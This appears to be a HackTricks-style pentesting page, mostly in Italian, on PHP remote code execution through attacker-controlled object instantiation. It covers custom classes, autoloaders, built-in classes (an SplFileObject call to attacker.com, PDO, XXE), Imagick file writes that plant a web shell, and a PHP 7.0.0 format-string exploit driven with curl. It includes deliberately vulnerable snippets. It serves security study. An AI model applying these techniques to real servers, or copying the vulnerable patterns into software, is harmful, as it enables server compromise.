# PHP - RCE abusing object creation: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

This is basically a summary of [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Introduzione

La creazione di nuovi oggetti arbitrari, come `new $_GET["a"]($_GET["a"])`, può portare a Remote Code Execution (RCE), come dettagliato in una [**analisi**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Questo documento evidenzia varie strategie per ottenere RCE.

## RCE via Custom Classes or Autoloading

La sintassi `new $a($b)` è usata per istanziare un oggetto dove **`$a`** rappresenta il nome della classe e **`$b`** è il primo argomento passato al costruttore. Queste variabili possono essere ottenute da input utente come GET/POST, dove possono essere stringhe o array, o da JSON, dove possono presentarsi come altri tipi.

Considera lo snippet di codice sotto:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
In questo caso, impostare `$a` su `App` o `App2` e `$b` su un comando di sistema (ad es., `uname -a`) provoca l'esecuzione di quel comando.

**Funzioni di autoloading** possono essere sfruttate se tali classi non sono direttamente accessibili. Queste funzioni caricano automaticamente le classi da file quando necessario e sono definite usando `spl_autoload_register` o `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Il comportamento dell'autoloading varia tra le versioni di PHP, offrendo diverse possibilità di RCE.

## RCE tramite classi built-in

In assenza di classi personalizzate o di autoloader, **le classi built-in di PHP** possono essere sufficienti per ottenere RCE. Il numero di queste classi varia tra 100 e 200, a seconda della versione di PHP e delle estensioni. Possono essere elencate usando `get_declared_classes()`.

I costruttori di interesse possono essere identificati tramite la reflection API, come mostrato nel seguente esempio e nel link [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

Esempi di RCE tramite metodi specifici:

### **SSRF + Phar Deserialization**

La classe `SplFileObject` permette SSRF tramite il suo costruttore, consentendo connessioni a qualsiasi URL:
```php
new SplFileObject('http://attacker.com/');
```
SSRF può portare a deserialization attacks nelle versioni di PHP precedenti alla 8.0 usando il protocollo Phar.

### **Exploiting PDOs**

Il costruttore della classe PDO consente connessioni a database tramite stringhe DSN, potenzialmente abilitando la creazione di file o altre interazioni:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Le versioni di PHP fino a 5.3.22 e 5.4.12 erano suscettibili agli attacchi XXE tramite i costruttori `SoapClient` e `SimpleXMLElement`, a seconda della versione di libxml2.

## RCE via Imagick Extension

Nell'analisi delle **dipendenze del progetto** è stato scoperto che **Imagick** poteva essere sfruttato per **command execution** istanziando nuovi oggetti. Questo rappresenta un'opportunità per sfruttare vulnerabilità.

### VID parser

È stata identificata la capacità del VID parser di scrivere contenuti in qualsiasi percorso specificato del filesystem. Questo potrebbe portare al posizionamento di una shell PHP in una directory accessibile via web, ottenendo Remote Code Execution (RCE).

#### VID Parser + File Upload

Si osserva che PHP memorizza temporaneamente i file caricati in `/tmp/phpXXXXXX`. Il VID parser in Imagick, utilizzando il protocollo **msl**, può gestire wildcard nei percorsi dei file, facilitando il trasferimento del file temporaneo in una posizione scelta. Questo metodo offre un approccio aggiuntivo per ottenere la scrittura arbitraria di file all'interno del filesystem.

### PHP Crash + Brute Force

Un metodo descritto nel [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) prevede il caricamento di file che causano il crash del server prima della loro cancellazione. Bruteforcando il nome del file temporaneo, diventa possibile per Imagick eseguire codice PHP arbitrario. Tuttavia, questa tecnica si è rivelata efficace solo in una versione obsoleta di ImageMagick.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

Quando l'input utente controlla il nome della classe (es., `new $_GET['model']()`), PHP 7.0.0 ha introdotto un bug transitorio durante il refactor di `Throwable` in cui il motore interpretava per errore il nome della classe come una stringa di formato printf durante la risoluzione. Questo abilita i classici primitivi in stile printf all'interno di PHP: leaks con `%p`, controllo del conteggio di scrittura con specificatori di larghezza, e scritture arbitrarie con `%n` contro puntatori in-process (ad esempio, entry della GOT su build ELF).

Pattern minimo di riproduzione vulnerabile:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
Schema di sfruttamento (dal riferimento):
- Leak addresses via `%p` nel nome della classe per trovare un target scrivibile:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- Usa parametri posizionali e specifier di width per impostare un conteggio esatto di byte, poi `%n` per scrivere quel valore in un indirizzo raggiungibile nello stack, mirando a uno slot GOT (es., `free`) per sovrascriverlo parzialmente verso `system`.
- Innesca la funzione dirottata passando un nome di classe contenente una shell pipe per raggiungere `system("id")`.

Note:
- Funziona solo su PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); corretto nelle release successive. Gravità: critica se esiste l'instanziazione arbitraria di classi.
- I payload tipici concatenano molti `%p` per scorrere lo stack, poi `%.<width>d%<pos>$n` per ottenere la sovrascrittura parziale desiderata.

## Riferimenti

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
